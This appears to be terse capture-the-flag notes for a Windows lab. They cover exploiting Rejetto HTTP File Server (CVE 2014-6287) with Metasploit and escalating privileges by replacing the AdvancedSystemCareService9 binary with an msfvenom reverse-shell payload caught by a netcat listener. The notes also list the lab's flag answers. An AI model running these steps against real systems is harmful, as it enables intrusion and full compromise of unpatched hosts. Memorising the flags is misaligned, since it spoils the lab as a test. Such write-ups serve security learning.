
1. Passive Recon
	1. Started AutoRecon
	2. Visited website
		1. FLAG : Who is employee of the month : Bill Harper
	3. HTTP Port 8080 running Rejetto HTTPFilerSever 2.3
		1. FLAG : What server is running : Rejetto HTTP File Server
		2. This has an RCE within Metasploit
			1. FLAG : CVE 2014-6287
2.  Exploit HtttpFileServer with Metasploit
	1. Gained initial shell into system
		1. Moved to the Desktop and found user.txt
		2. FLAG : ��b04763b6fcf51fcd7c13abc7db4fd365
3. PrivEsc
	1. Locate PowerUp.ps1 script for PrivEsc
		1. Using Meterpreter we use the `upload` feature
			1. upload `script/file`
		2. Switch to Powershell .. shell
			1. In Meterpreter `load powershell` then `powershell_shell` 
			2. Now with the new PS shell;
				1. `. .\PowerUp.ps1` to load the script, then `Invoke-AllChecks` to run
	2. We found a pathway to escalate, `AdvancedSystemCareService9`
		1. FLAG : AdvancedSystemCareService9
	3. Craft out exploit escalate Priv
		1. `msfvenom -p windows/shell_reverse_tcp LHOST=10.6.9.20 LPORT=4443 -e x86/shikata_ga_nai -f exe-service -o ASCService.exe`
		2. Now while in the shell, move to this file location and;
			1. `sc stop AdvancedSystemCareService9` 
			2. Switch back to meterpreter and;
		3. Lets swap the `C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe` with out msfvenom file
			1. Switch back to shell, running `sc start AdvancedSystemCareService9` will trigger our verse shell.
			2. nc -lvnp to capture the RevShell and navigate to Administrators desktop.
			3. FLAG : 9af5f314f57607c00fd09803a587db80
4. Complete